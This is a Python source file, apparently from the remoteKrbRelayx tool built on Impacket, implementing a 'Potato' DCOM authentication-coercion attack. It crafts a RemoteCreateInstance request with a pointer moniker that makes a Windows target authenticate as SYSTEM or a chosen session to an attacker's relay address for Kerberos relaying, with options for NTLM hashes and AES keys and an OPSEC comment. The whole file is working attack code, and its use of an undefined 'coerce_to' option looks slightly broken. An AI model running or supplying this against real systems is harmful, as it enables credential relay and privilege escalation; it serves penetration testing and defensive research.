#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This module contains the Potato class, which is used for coercing RPC authentication through DCOM.
# Author:
#   Sylvain Heiniger (@sploutchy) / Compass Security (https://compass-security.com)
# 
# Fitted for remoteKrbRelayx by Ole Fredrik Borgundvåg Berg (@olefredrikberg) / Helse- og KommuneCERT
#

import random
import sys
import argparse
import logging
from impacket import version, uuid
from impacket.examples import logger, utils
from impacket.dcerpc.v5 import dcomrt, dtypes, rpcrt

IID_IStandardActivator = uuid.uuidtup_to_bin(('000001B8-0000-0000-c000-000000000046','0.0'))
IID_IStorage = uuid.uuidtup_to_bin(('0000000B-0000-0000-C000-000000000046','0.0'))
CLSID_PointerMoniker = uuid.string_to_bin('00000306-0000-0000-C000-000000000046')

CLSCTX_REMOTE_SERVER = 0x10
CTXMSHLFLAGS_BYVAL = 0x00000002

class SpecialPropertiesData(rpcrt.TypeSerialization1):
    structure = (
        ('dwSessionId',dtypes.ULONG),
        ('fRemoteThisSessionId',dtypes.ULONG),
        ('fClientImpersonating',dtypes.LONG),
        ('fPartitionIDPresent',dtypes.LONG),
        ('dwDefaultAuthnLvl',dtypes.DWORD),
        ('guidPartition',dtypes.GUID),
        ('dwPRTFlags',dtypes.DWORD),
        ('dwOrigClsctx',dtypes.DWORD),
        ('dwFlags',dtypes.DWORD),
        ('Reserved0',dtypes.DWORD),
        ('Reserved1',dtypes.DWORD),
        ('Reserved2',dtypes.ULONGLONG),
        ('Reserved3_1',dtypes.DWORD),
        ('Reserved3_2',dtypes.DWORD),
        ('Reserved3_3',dtypes.DWORD),
        ('Reserved3_4',dtypes.DWORD),
        ('Reserved3_5',dtypes.DWORD),
    )

class DUALSTRINGARRAY(dcomrt.DUALSTRINGARRAYPACKED):    
    def __init__(self, strBindings: list[dcomrt.STRINGBINDING], secBindings: list[dcomrt.SECURITYBINDING]):
        dcomrt.DUALSTRINGARRAYPACKED.__init__(self)
        self.__strBindings = strBindings
        self.__secBindings = secBindings

    def getData(self, soFar = 0):
        strBindings_array = b''.join([strBinding.getData() for strBinding in self.__strBindings]) + b'\x00\x00'
        secBindings_array = b''.join([secBinding.getData() for secBinding in self.__secBindings]) + b'\x00\x00'
        wsecurityOffset = int(len(strBindings_array)/2)
        self['wNumEntries'] = int((len(strBindings_array) + len(secBindings_array))/2)
        self['wSecurityOffset'] = wsecurityOffset
        self['aStringArray'] = strBindings_array + secBindings_array
        return dcomrt.DUALSTRINGARRAYPACKED.getData(self, soFar)

class Potato:
    def __init__(self, domain, username, password, target, options):
        self.__domain = domain
        self.__username = username
        self.__password = password
        self.__target = target
        self.__options = options
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__doKerberos = options.k
        self.__kdcHost = options.dc_ip
        self.__session_id = options.session_id
        self.__clsid = options.clsid
        self.__coerce_to = options.coerce_to
        self.__spn = options.spn
        self.__dcom = None

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def RemoteCreateInstance(self):
        # Only supports one interface at a time
        self.__dcom.get_dce_rpc().bind(dcomrt.IID_IRemoteSCMActivator)

        ORPCthis = dcomrt.ORPCTHIS()
        ORPCthis['cid'] = uuid.generate()
        ORPCthis['extensions'] = dtypes.NULL
        ORPCthis['flags'] = 1

        request = dcomrt.RemoteCreateInstance()
        request['ORPCthis'] = ORPCthis
        request['pUnkOuter'] = dtypes.NULL

        activationBLOB = dcomrt.ACTIVATION_BLOB()
        activationBLOB['CustomHeader']['destCtx'] = 2
        activationBLOB['CustomHeader']['pdwReserved'] = dtypes.NULL
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_SpecialSystemProperties
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_InstantiationInfo
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_ActivationContextInfo
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_SecurityInfo
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_ServerLocationInfo
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_InstanceInfo
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)
        pclsid = dcomrt.CLSID()
        pclsid['Data'] = dcomrt.CLSID_ScmRequestInfo
        activationBLOB['CustomHeader']['pclsid'].append(pclsid)

        properties = b''
        # SpecialSystemProperties 
        specialSystemProperties = SpecialPropertiesData()
        if self.__session_id is None: # SYSTEM
            logging.debug("Coercing authentication as SYSTEM")
            specialSystemProperties['dwSessionId'] = 0xFFFFFFFF
            specialSystemProperties['fRemoteThisSessionId'] = 0x0
            specialSystemProperties['dwFlags'] = 0x1
        else: # Cross-session
            logging.debug(f"Coercing authentication in session {self.__session_id}")
            specialSystemProperties['dwSessionId'] = int(self.__session_id)
            specialSystemProperties['fRemoteThisSessionId'] = 0x1
            specialSystemProperties['dwFlags'] = 0x2
        specialSystemProperties['dwDefaultAuthnLvl'] = rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY

        dword = dtypes.DWORD()
        marshaled = specialSystemProperties.getDataAndReferents()
        dword['Data'] = len(marshaled)
        activationBLOB['CustomHeader']['pSizes'].append(dword)

        properties += marshaled

        # InstantiationInfo
        instantiationInfo = dcomrt.InstantiationInfoData()
        logging.debug(f"Using CLSID {self.__clsid}")
        instantiationInfo['classId'] = uuid.string_to_bin(self.__clsid)
        instantiationInfo['classCtx'] = CLSCTX_REMOTE_SERVER
        instantiationInfo['cIID'] = 1

        _iid = dcomrt.IID()
        _iid['Data'] = dcomrt.IID_IUnknown                  

        instantiationInfo['pIID'].append(_iid)

        dword = dtypes.DWORD()
        marshaled = instantiationInfo.getDataAndReferents()
        dword['Data'] = len(marshaled)
        activationBLOB['CustomHeader']['pSizes'].append(dword)
        instantiationInfo['thisSize'] = int(dword['Data'])
        marshaled = instantiationInfo.getDataAndReferents()
        properties += marshaled

        # ActivationContextInfoData
        activationInfo = dcomrt.ActivationContextInfoData()

        clientContext = dcomrt.Context()
        clientContext['MajorVersion'] = 1
        clientContext['MinVersion'] = 1
        clientContext['ContextId'] = uuid.generate()
        clientContext['Flags'] = CTXMSHLFLAGS_BYVAL
        clientContext['Count'] = 0
        clientContext['Frozen'] = 1
        clientContext['PropMarshalHeader'] = dtypes.NULL

        objRefCustom = dcomrt.OBJREF_CUSTOM()
        objRefCustom['iid'] = dcomrt.IID_IContext
        objRefCustom['clsid'] = dcomrt.CLSID_ContextMarshaler
        objRefCustom['ObjectReferenceSize'] = len(clientContext.getData())
        objRefCustom['pObjectData'] = clientContext.getData()

        activationInfo['pIFDClientCtx']['ulCntData'] = len(objRefCustom.getData()+objRefCustom.getDataReferents())
        activationInfo['pIFDClientCtx']['abData'] = objRefCustom.getData()+objRefCustom.getDataReferents()
        activationInfo['pIFDPrototypeCtx'] = dtypes.NULL

        dword = dtypes.DWORD()
        marshaled = activationInfo.getDataAndReferents()
        dword['Data'] = len(marshaled)
        activationBLOB['CustomHeader']['pSizes'].append(dword)

        properties += marshaled

        # SecurityInfo
        securityInfo = dcomrt.SecurityInfoData()
        securityInfo['pServerInfo'] = dcomrt.PCOSERVERINFO()
        securityInfo['pServerInfo']['pwszName'] = self.__target + "\x00"
        securityInfo['pServerInfo']['pdwReserved'] = dtypes.NULL
        securityInfo['pdwReserved'] = dtypes.NULL

        dword = dtypes.DWORD()
        marshaled = securityInfo.getDataAndReferents()
        dword['Data'] = len(marshaled)
        activationBLOB['CustomHeader']['pSizes'].append(dword)

        properties += marshaled

        # ServerLocation
        locationInfo = dcomrt.LocationInfoData()
        locationInfo['machineName'] = dtypes.NULL

        dword = dtypes.DWORD()
        dword['Data'] = len(locationInfo.getDataAndReferents())
        activationBLOB['CustomHeader']['pSizes'].append(dword)

        properties += locationInfo.getDataAndReferents()

        # InstanceInfo
        instanceInfo = dcomrt.InstanceInfoData()
        # You should modify this for great OPSEC
        instanceInfo['fileName'] = "hello.stg\x00"
        instanceInfo['mode'] = 0x12
        instanceInfo['ifdROT'] = dtypes.NULL

        pointerMoniker = dcomrt.OBJREF_STANDARD()
        pointerMoniker['iid'] = dcomrt.IID_IUnknown
        pointerMoniker['std']['flags'] = 641
        pointerMoniker['std']['cPublicRefs'] = 0
        pointerMoniker['std']['oxid'] = random.getrandbits(64)
        pointerMoniker['std']['oid'] = random.getrandbits(64)
        # First part of IPID is not random ... no idea if someone checks this:
        # page number (16), random (6), page entry (10), process id (16), appartment id (16)
        pointerMoniker['std']['ipid'] = b'\x02\x78\x00\x00\x20\x06\xff\xff'+random.randbytes(8)

        stringbindings = []

        ip_stringBinding = dcomrt.STRINGBINDING()
        ip_stringBinding['wTowerId'] = 7
        ip_stringBinding['aNetworkAddr'] = f"{self.__coerce_to}\x00"
        stringbindings.append(ip_stringBinding)
        
        logging.debug("OXID Resolver should be at %s" % ", ".join([a['aNetworkAddr'] for a in stringbindings]))

        securityBinding = dcomrt.SECURITYBINDING()
        securityBinding['wAuthnSvc'] = rpcrt.RPC_C_AUTHN_GSS_KERBEROS
        securityBinding['aPrincName'] = self.__spn + "\x00"
        logging.debug(f"Setting the desired SPN to {self.__spn}")
        securityBinding['Reserved'] = 0xFFFF

        saResAddr = DUALSTRINGARRAY(stringbindings, [securityBinding])
        pointerMoniker['saResAddr'] = saResAddr.getData()

        objRefCustom = dcomrt.OBJREF_CUSTOM()
        objRefCustom['iid'] = IID_IStorage[:-4]
        objRefCustom['clsid'] = CLSID_PointerMoniker
        objRefCustom['ObjectReferenceSize'] = 0x00000400 # This is no size
        objRefCustom['pObjectData'] = pointerMoniker.getData()
        instanceInfo['ifdStg']['ulCntData'] = len(objRefCustom.getData())
        instanceInfo['ifdStg']['abData'] = list(objRefCustom.getData())

        dword = dtypes.DWORD()
        marshaled = instanceInfo.getDataAndReferents()
        dword['Data'] = len(marshaled)
        activationBLOB['CustomHeader']['pSizes'].append(dword)

        properties += marshaled

       # ScmRequestInfo
        scmInfo = dcomrt.ScmRequestInfoData()
        scmInfo['pdwReserved'] = dtypes.NULL
        scmInfo['remoteRequest']['ClientImpLevel'] = 0x2
        scmInfo['remoteRequest']['cRequestedProtseqs'] = 1
        scmInfo['remoteRequest']['pRequestedProtseqs'].append(7)

        dword = dtypes.DWORD()
        marshaled = scmInfo.getDataAndReferents()
        dword['Data'] = len(marshaled)
        activationBLOB['CustomHeader']['pSizes'].append(dword)

        properties += marshaled

        activationBLOB['Property'] = properties


        objrefcustom = dcomrt.OBJREF_CUSTOM()
        objrefcustom['iid'] = dcomrt.IID_IActivationPropertiesIn[:-4]
        objrefcustom['clsid'] = dcomrt.CLSID_ActivationPropertiesIn

        objrefcustom['pObjectData'] = activationBLOB.getDataAndReferents()
        objrefcustom['ObjectReferenceSize'] = len(objrefcustom['pObjectData'])

        request['pActProperties']['ulCntData'] = len(objrefcustom.getData())
        request['pActProperties']['abData'] = list(objrefcustom.getData())
        resp = self.__dcom.get_dce_rpc().request(request)

    def run(self):
        self.__dcom = dcomrt.DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                        self.__aesKey, authLevel=rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, 
                        oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

        try:
            self.RemoteCreateInstance()

        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            if "'SpecialPropertiesData' object has no attribute 'getDataAndReferents'" in str(e):
                logging.error(str(e) + ". You are most likely using wrong Impacket version. Remove the current version and install the one in requirements.txt.")
            else:
                logging.error(str(e) + ". Note that DCOM errors also happens during successful relays.")
        finally:
            self.__dcom.disconnect()

if __name__ == '__main__':
    print(version.BANNER)
    logger.init()

    parser = argparse.ArgumentParser(add_help = True, description = "Potato implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('potato')
    group.add_argument('-clsid', action='store', metavar="CLSID", help='A DCOM CLSID, default is d99e6e74-fc88-11d0-b498-00a0c90312f3 (CertifiedDCOM)')
    group.add_argument('-relay-ip', action='store', metavar="IP", help='The IP of the relayer (yourself?)')
    group.add_argument('-relay-hostname', action='store', metavar="HOSTNAME", help='The hostname of the relayer (yourself?)')
    group.add_argument('-relay-port', action='store', metavar="PORT", help='The RPC port of the relayer')
    group.add_argument('-session-id', action='store', help='Session ID to perform cross-session activation (default to nothing = SYSTEM activation)')
    group.add_argument('-kerberos', action='store_true', help='Perform relay to kerberos')
    group.add_argument('-spn', action='store', metavar="PROTOCOL\\SERVER", help='SPN to use for the kerberos relaying (default HOST/target)')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = utils.parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password: ")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.relay_ip is None and options.relay_hostname is None:
        logging.error("You need to specify either relay_ip or relay_hostname")
        sys.exit(1)

    potato = Potato(domain, username, password, address, options)
    try:
        potato.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
